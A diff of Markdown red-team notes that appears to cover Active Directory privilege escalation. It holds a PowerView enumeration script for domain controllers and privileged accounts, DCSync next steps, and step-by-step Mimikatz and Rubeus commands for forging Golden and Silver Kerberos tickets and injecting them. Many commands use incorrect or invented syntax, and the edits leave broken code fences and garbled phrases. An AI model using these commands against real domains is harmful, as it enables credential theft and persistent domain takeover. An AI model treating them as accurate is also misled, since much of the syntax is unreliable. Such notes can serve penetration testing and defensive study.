@@ -356,7 +356,7 @@ foreach ($dc in $domainControllers) {
 ### **PowerView Script: Targeting Domain Controllers for Privilege Escalation**
 This PowerView script is tailored for targeting domain controllers (DCs) to enable further exploitation like Kerberos ticket manipulation or DCSync. This script focuses on enumerating DCs and identifying users with elevated permissions or misconfigured ACLs that could be exploited for privilege escalation.
 
-```powershell
+```
 # Import PowerView module
 Import-Module .\PowerView.ps1
 
@@ -430,10 +430,10 @@ Write-Host "  ----------------------------"
 
 ---
 
-### **How This Fits into TA0004 (Privilege Escalation)**
+### **How This Fits Into TA0004 (Privilege Escalation)**
 
 1. **Targeting Domain Controllers**:
-   - DCs are critical for **DCSync** and **Kerberos ticket manipulation** because they hold domain credentials in the **`NTDS.dit`** file and issue Kerberos tickets.
+   - DCs are critical for DCSync and Kerberos ticket manipulation because they hold domain credentials in the **`NTDS.dit`** file and issue Kerberos tickets.
    - The script identifies DCs using `OperatingSystem -like "*Windows Server*"` and extracts their names and properties.
 
 2. **Finding Domain Admins**:
@@ -443,36 +443,35 @@ Write-Host "  ----------------------------"
    - DCs often have local admin accounts with elevated rights. The script checks for local admin privileges via `OtherAttributes` (e.g., `LocalAccountTokenFilterPolicy`), which can be exploited for lateral movement.
 
 4. **Weak Passwords**:
-   - Users with `PasswordNeverExpires` or unset `PasswordLastSet` values are vulnerable to **credential theft**. These users can be used to impersonate or manipulate Kerberos tickets.
+   - Users with `PasswordNeverExpires` or unset `PasswordLastSet` values are vulnerable to credential theft. These users can be used to impersonate or manipulate Kerberos tickets.
 
 5. **Misconfigured ACLs**:
-   - The script checks permissions on the `NTDS` object to find users or groups with **write access** to the domain's SYSVOL or NTDS.dit files, enabling **DCSync** attacks.
+   - The script checks permissions on the `NTDS` object to find users or groups with **write access** to the domain's `SYSVOL` or `NTDS.dit` files, enabling DCSync attacks.
 
 ---
 
 ### **Next Steps After Enumeration**
 Once domain controllers and privileged users are identified, you can:
 - Use **DCSync** to extract domain credentials via:
-  ```powershell
+  ```
   # Example using BloodHound or Mimikatz for DCSync
   Invoke-DCSync -Domain
 
+  # Import PowerView module
+  Import-Module PowerView
 
-# Import PowerView module
-Import-Module PowerView
+  # Enumerate users and their properties
+  Get-User -Domain domain.com -UserName *
 
-# Enumerate users and their properties
-Get-User -Domain domain.com -UserName *
+  # Enumerate groups and members
+  Get-Group -Domain domain.com -GroupName *
 
-# Enumerate groups and members
-Get-Group -Domain domain.com -GroupName *
+  # Find users with specific privileges (e.g., administrators)
+  Get-ADObject -Filter {objectClass -eq "user"} -Properties * | Where-Object { $_.userAccountControl -band 16777216 }
 
-# Find users with specific privileges (e.g., administrators)
-Get-ADObject -Filter {objectClass -eq "user"} -Properties * | Where-Object { $_.userAccountControl -band 16777216 }
+  # Enumerate Processes and Their Owners (for lateral movement)
+  Get-Process -ComputerName target.com | Select-Object ProcessName, Owner
 
-# Enumerate processes and their owners (for lateral movement)
-Get-Process -ComputerName target.com | Select-Object ProcessName, Owner
-```
 ## Golden/Silver Ticket Attacks [(T1558)](https://attack.mitre.org/techniques/T1558/)
 ### Attack Details
 A Golden Ticket is a critical post-exploitation technique used to forge Kerberos Ticket Granting Tickets (TGTs), granting individuals unlimited, near-undetectable, and persistent administrative access to an Active Directory (AD) domain. The attack is often executed using `mimikatz.exe` to extract the necessary cryptographic keys from a compromised Domain Controller (DC).
@@ -490,11 +489,11 @@ Using the extracted hash, the individual uses `mimikatz.exe` to generate a forge
 ### 5. Pass-the-Ticket (Injection)
 With the `/ptt` flag (Pass-the-Ticket), Mimikatz injects the forged ticket directly into the current session memory.
 ### 6. Unrestricted Access
-The individual now has full, legitimate-appearing access to any services, such as file servers, and databases within the compromised domain.
-* * **TL;DR**: Forging Kerberos Ticket Granting Tickets (TGT) to maintain domain administrator access.
+The individual now has full, legitimate-appearing access to any services, such as file servers, and databases within the compromised domain.<br>
+* **🔸TL;DR**: Forging Kerberos Ticket Granting Tickets (TGT) to maintain domain administrator access.
 ### Tool Used
 * Mimikatz
-* * **Use for**: Golden Ticket (Kerberos TGT for Domain-Wide Access)
+* **Use for**: Golden Ticket (Kerberos TGT for Domain-Wide Access)
 ```
 # Step 1: Get krbtgt hash (requires SYSTEM privileges)  
 mimikatz.exe "lsa::dump /domain"  
@@ -526,7 +525,7 @@ mimikatz.exe "ts::login /user:serviceAccount /domain:example.com"
 ```
 ### Tool Used
 * Rubeus - Golden & Silver Tickets
-* **Use for**: Golden Ticket (Kerberos TGT)
+* **Used for**: Golden Ticket (Kerberos TGT) Attacks known for, strenght weak
 ```
 # Step 1: Request a Golden Ticket (using domain credentials)  
 Rubeus.exe golden /user:Administrator /password:Secretpass123 /domain:example.com /sid:S-1-5-21-... /target:target.com  
@@ -539,8 +538,8 @@ Rubeus.exe kerberos::ticket /ticket:golden_ticket.kirbi /s:target.com
 ```
 ### Tool Used
 * Rubeus
-* **Use for**: Silver Ticket (Kerberos Service Ticket)
-```
+* **Used for**: Silver Ticket (Kerberos Service Ticket) Attacks
+
 # Step 1: Request a Silver Ticket (using service account credentials)  
 Rubeus.exe silver /service:HTTP/target.com /user:serviceAccount /password:Secretpass123 /domain:example.com /dc:domain.com  
 
@@ -549,22 +548,22 @@ Rubeus.exe ptt /ticket:silver_ticket.kirbi
 
 # Step 3: Access the service (e.g., HTTP) with the ticket  
 Rubeus.exe kerberos::ticket /ticket:silver_ticket.kirbi /s:target.com
-```
+
 ### Tool Used
 * PowerView - Enumeration for Ticket Attacks
 * **Use for**: Golden Ticket (Identify Target for Impersonation)
-```
+
 # Step 1: Enumerate domain users (including administrators)  
 Import-Module PowerView  
 Get-User -Domain example.com | Where-Object { $_.UserAccountControl -band 16777216 }  
 
 # Step 2: Find service accounts or SPNs for Silver Ticket targets  
 Get-SPN -Domain example.com | Select-Object -ExpandProperty SPN  
-```
+
 ### Tool Used
 * PowerView
 * **Use for**: Silver Ticket (Identify Service Targets)
-```
+
 # Step 1: Enumerate all services (SPNs) in the domain  
 Get-SPN -Domain example.com  
 
